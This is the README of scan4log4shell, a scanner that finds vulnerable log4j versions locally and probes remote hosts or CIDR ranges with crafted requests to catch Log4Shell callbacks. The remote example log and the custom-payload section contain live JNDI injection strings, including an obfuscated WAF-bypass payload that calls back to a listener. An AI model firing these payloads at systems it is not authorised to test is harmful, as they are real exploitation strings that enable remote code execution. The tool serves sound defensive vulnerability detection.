# scan4log4shell
> Scanner to detect vulnerable log4j versions on your file-system or to send specially crafted requests and catch callbacks of systems that are impacted by log4j log4shell vulnerability

CVE-2021-44228 is a remote code execution (RCE) vulnerability in Apache Log4j 2. An unauthenticated, remote attacker could exploit this flaw by sending a specially crafted request to a server running a vulnerable version of log4j. The crafted request uses a Java Naming and Directory Interface (JNDI) injection via a variety of services including:
- Lightweight Directory Access Protocol (LDAP)
- Secure LDAP (LDAPS)
- Remote Method Invocation (RMI)
- Domain Name Service (DNS)

:warning: There is a patch bypass on Log4J v2.15.0: [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) 
## Installing
You can install the pre-compiled binary in several different ways

### homebrew tap:
```bash
brew tap hupe1980/scan4log4shell
brew install scan4log4shell
```
### scoop:
```bash
scoop bucket add scan4log4shell https://github.com/hupe1980/scan4log4shell-bucket.git
scoop install scan4log4shell
```

### deb/rpm/apk:

Download the .deb, .rpm or .apk from the [releases page](https://github.com/hupe1980/scan4log4shell/releases) and install them with the appropriate tools.

### manually:
Download the pre-compiled binaries from the [releases page](https://github.com/hupe1980/scan4log4shell/releases) and copy to the desired location.

## Usage 
```bash
Usage:
  scan4log4shell [command]

Available Commands:
  catch       Start a callback catcher
  completion  Prints shell autocompletion scripts for scan4log4shell
  help        Help about any command
  local       Detect vulnerable log4j versions on your file-system
  remote      Send specially crafted requests and catch callbacks of systems that are impacted by log4j log4shell vulnerability

Flags:
  -h, --help            help for scan4log4shell
      --no-color        disable color output
  -o, --output string   output logfile name
  -v, --verbose         print detailed logging messages
      --version         version for scan4log4shell

Use "scan4log4shell [command] --help" for more information about a command.
```

## Local
Detect vulnerable log4j versions on your file-system
```bash
Usage:
  scan4log4shell local [paths] [flags]

Flags:
      --check-cve-2021-45046     check for CVE-2021-45046
  -e, --exclude stringArray      path to exclude
  -h, --help                     help for local
      --ignore-ext stringArray   ignore .jar | .zip | .war | .ear | .aar
      --ignore-v1                ignore log4j 1.x versions
      --max-threads int          max number of concurrent threads (default 5)
      --show-safe                show cve-2021-44228 safe versions

Global Flags:
      --no-color        disable color output
  -o, --output string   output logfile name
  -v, --verbose         print detailed logging messages
```

### Example
```bash
make run-local

scanner_1  | [i] Log4Shell CVE-2021-44228 Local Vulnerability Scan
scanner_1  | [i] Start scanning path /walk
scanner_1  | ---------
scanner_1  | [i] Inspecting /walk/apache-log4j-2.14.0-bin/log4j-1.2-api-2.14.0-javadoc.jar...
scanner_1  | [i] Inspecting /walk/apache-log4j-2.14.0-bin/log4j-1.2-api-2.14.0-sources.jar...
scanner_1  | [i] Inspecting /walk/apache-log4j-2.14.0-bin/log4j-1.2-api-2.14.0.jar...
scanner_1  | [i] Inspecting /walk/apache-log4j-2.14.0-bin/log4j-api-2.14.0-javadoc.jar...
scanner_1  | [i] Inspecting /walk/apache-log4j-2.14.0-bin/log4j-api-2.14.0-sources.jar...
scanner_1  | [i] Inspecting /walk/apache-log4j-2.14.0-bin/log4j-api-2.14.0.jar...
scanner_1  | [i] Inspecting /walk/apache-log4j-2.14.0-bin/log4j-core-2.14.0.jar...
scanner_1  | [!] Hit: possibly vulnerable file identified: /walk/apache-log4j-2.14.0-bin/log4j-core-2.14.0.jar
scanner_1  | [i] Inspecting /walk/apache-log4j-2.15.0-bin/log4j-api-2.15.0.jar...
scanner_1  | [i] Inspecting /walk/apache-log4j-2.15.0-bin/log4j-core-2.15.0.jar...
scanner_1  | [i] Inspecting /walk/apache-log4j-2.15.0-bin/log4j-spring-boot-2.15.0.jar...
scanner_1  | [i] Inspecting /walk/apache-log4j-2.16.0-bin/log4j-api-2.16.0.jar...
scanner_1  | [i] Inspecting /walk/apache-log4j-2.16.0-bin/log4j-core-2.16.0.jar...
scanner_1  | [i] Inspecting /walk/jakarta-log4j-1.2.8/dist/lib/log4j-1.2.8.jar...
scanner_1  | [!] Hit: log4j V1 identified: /walk/jakarta-log4j-1.2.8/dist/lib/log4j-1.2.8.jar
scanner_1  | [i] Completed scanning
```

## Remote
Send specially crafted requests and catch callbacks of systems that are impacted by log4j log4shell vulnerability
```
Usage:
  scan4log4shell remote [command]

Available Commands:
  cidr        Send specially crafted requests to a cidr
  url         Send specially crafted requests to an url

Flags:
  -h, --help   help for remote

Global Flags:
      --no-color        disable color output
  -o, --output string   output logfile name
  -v, --verbose         print detailed logging messages
```

### Remote CIDR
Send specially crafted requests to a cidr
```
Usage:
  scan4log4shell remote cidr [cidr] [flags]

Flags:
      --caddr string            address to catch the callbacks (eg. ip:port)
      --check-cve-2021-45046    check for CVE-2021-45046
      --fields-file string      use custom field from file
      --headers-file string     use custom headers from file
  -h, --help                    help for cidr
      --listen                  start a listener to catch callbacks
      --max-threads int         max number of concurrent threads (default 150)
      --no-basic-auth-fuzzing   exclude basic auth from fuzzing
      --no-redirect             do not follow redirects
      --no-user-agent-fuzzing   exclude user-agent header from fuzzing
      --no-wait-timeout         wait forever for callbacks
      --payloads-file string    use custom payloads from file
  -p, --port stringArray        port to scan (default [8080])
      --proxy string            proxy url
      --schema string           schema to use for requests (default "https")
      --timeout duration        time limit for requests (default 3s)
  -t, --type string             get, post or json (default "get")
      --waf-bypass              extend scans with WAF bypass payload
  -w, --wait duration           wait time to catch callbacks (default 5s)

Global Flags:
      --no-color        disable color output
  -o, --output string   output logfile name
  -v, --verbose         print detailed logging messages
```

### Remote url
Send specially crafted requests to an url
```
Usage:
  scan4log4shell remote url [url] [flags]

Flags:
      --caddr string            address to catch the callbacks (eg. ip:port)
      --check-cve-2021-45046    check for CVE-2021-45046
      --fields-file string      use custom field from file
      --headers-file string     use custom headers from file
  -h, --help                    help for url
      --listen                  start a listener to catch callbacks
      --max-threads int         max number of concurrent threads (default 150)
      --no-basic-auth-fuzzing   exclude basic auth from fuzzing
      --no-redirect             do not follow redirects
      --no-user-agent-fuzzing   exclude user-agent header from fuzzing
      --no-wait-timeout         wait forever for callbacks
      --payloads-file string    use custom payloads from file
      --proxy string            proxy url
      --timeout duration        time limit for requests (default 3s)
  -t, --type string             get, post or json (default "get")
      --waf-bypass              extend scans with WAF bypass payload
  -w, --wait duration           wait time to catch callbacks (default 5s)

Global Flags:
      --no-color        disable color output
  -o, --output string   output logfile name
  -v, --verbose         print detailed logging messages
```
### Example
```bash
make run-remote

scanner_1  | [i] Log4Shell CVE-2021-44228 Remote Vulnerability Scan
scanner_1  | [i] Listening on 172.20.0.30:4444
scanner_1  | [i] Start scanning CIDR 172.20.0.0/24
scanner_1  | ---------
scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.0:8080
scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.1:8080
scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.2:8080
scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.3:8080
scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.4:8080
scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.5:8080
scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.6:8080
scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.7:8080
scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.8:8080
scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.9:8080
scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.10:8080
scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.11:8080
scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.12:8080
scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.13:8080
scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.14:8080
scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.15:8080
scanner_1  | [!] Possibly vulnerable host identified: 172.20.0.13:60614
```

### Custom Payload
If you specify a file with custom payloads, you can use the following placeholders for callback address and resource:
- {{ .CADDR }}
- {{ .Resource }}

For example: 
```
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//{{ .CADDR }}/{{ .Resource }}}
```
You can find more examples [here](internal/resource/bypass.txt)

## References
- https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592
- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- https://nvd.nist.gov/vuln/detail/CVE-2021-45046


## License
[MIT](LICENCE)
